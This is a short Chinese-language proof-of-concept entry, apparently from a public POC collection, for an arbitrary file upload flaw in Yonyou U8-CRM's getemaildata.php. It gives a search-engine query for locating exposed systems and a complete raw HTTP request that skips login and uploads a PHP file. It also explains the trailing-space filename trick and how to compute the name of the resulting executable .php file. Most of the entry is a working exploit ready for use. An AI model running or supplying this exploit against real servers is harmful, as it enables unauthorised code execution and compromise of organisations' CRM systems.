## 用友U8-CRM客户关系管理系统getemaildata.php任意文件上传漏洞

## hunter
```
app.name="用友 CRM"
```


## poc
```
POST /ajax/getemaildata.php?DontCheckLogin=1 HTTP/1.1
Host: 
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarykS5RKgl8t3nwInMQ
Content-Length: 517

------WebKitFormBoundarykS5RKgl8t3nwInMQ
Content-Disposition: form-data; name="file"; filename="test.php "
Content-Type: text/plain

<?php phpinfo();?>
------WebKitFormBoundarykS5RKgl8t3nwInMQ
```

![9147057345d2ec4f1d7c8318ddf36883](https://github.com/wy876/POC/assets/139549762/5b3752aa-824e-4d81-8fe6-5d61cd77dc17)

上传包中文件的名称后要添加一个空格，不然上传之后不会解析。

上传之后返回的路径为E:\\U8SOFT\\turbocrm70\\code\\www\\tmpfile\\，文件名称为mhtB356.tmp.mht；文件不解析，需要访问另一个文件（上传之后会在目录下生成两个文件一个tmp.mht文件和一个tmp.php文件），访问的解析文件格式为udp***.tmp.php，星号部分为返回的文件名的十六进制减去一，例如：B356——>45910(十六进制)，45909（十六进制减一）——>b355。

![0cb454248fb7425131ee976bfff161f2](https://github.com/wy876/POC/assets/139549762/77be2d85-2c4c-46a4-8a95-71d415b2aa1a)

## 漏洞来源
- https://mp.weixin.qq.com/s/iCkvHKl-QC5o3gj_t02tmg
